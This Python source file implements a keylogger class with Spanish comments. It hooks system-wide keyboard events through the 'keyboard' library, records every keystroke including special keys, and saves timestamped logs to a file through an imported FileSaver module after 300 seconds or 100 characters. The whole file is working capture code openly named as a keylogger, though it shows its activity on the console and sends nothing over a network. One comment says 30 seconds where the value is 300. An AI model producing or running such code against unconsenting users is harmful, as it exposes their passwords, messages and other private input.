import keyboard
import time
from threading import Timer, Lock
from datetime import datetime
from FileSaver import savere

class Keylogger:
    def __init__(self, timeout=300, max_chars=100):  # 30 segundos o 100 caracteres
        self.timeout = timeout
        self.max_chars = max_chars
        self.timer = None
        self.text = self._initialize_text()
        self.running = False
        self.char_count = 0
        self.lock = Lock()
        
    def _initialize_text(self):
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        return (
            f"Recorded content from keylogger\n"
            f"At {now}\n"
            f"----------------------------\n\n\n"
        )
    
    def _save_content(self):
        """Guarda el contenido de forma segura"""
        with self.lock:
            if self.text.strip():
                savere.save_content_to_file(self.text)
                print(f"Registro guardado ({len(self.text)} caracteres)")
                self.text = self._initialize_text()  # Reset con nueva marca de tiempo
                self.char_count = 0
    
    def _reset_timer(self):
        if self.timer:
            self.timer.cancel()
        self.timer = Timer(self.timeout, self._save_content)
        self.timer.start()
    
    def _process_key_event(self, event):
        if event.event_type != 'up':
            return
            
        key = event.name
        with self.lock:
            if len(key) > 1:
                if key == "enter":
                    self.text += "\n"
                elif key == "backspace":
                    self.text = self.text[:-1]
                    self.char_count = max(0, self.char_count-1)
                else:
                    self.text += f" [{key}] "
            else:
                self.text += key
                self.char_count += 1
            
            print(key, end="", flush=True)
            
            # Guardar si se alcanza el máximo de caracteres
            if self.char_count >= self.max_chars:
                self._save_content()
        
        self._reset_timer()
    
    def start(self):
        if self.running:
            return
            
        self.running = True
        self._reset_timer()
        print(f"Keylogger iniciado")
        
        try:
            while self.running:
                event = keyboard.read_event()
                self._process_key_event(event)
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        if not self.running:
            return
            
        self.running = False
        if self.timer:
            self.timer.cancel()
        self._save_content()
        print("\nKeylogger detenido. Registro final guardado.")

if __name__ == "__main__":
    logger = Keylogger(timeout=300, max_chars=100)  # Ajusta estos valores
    logger.start()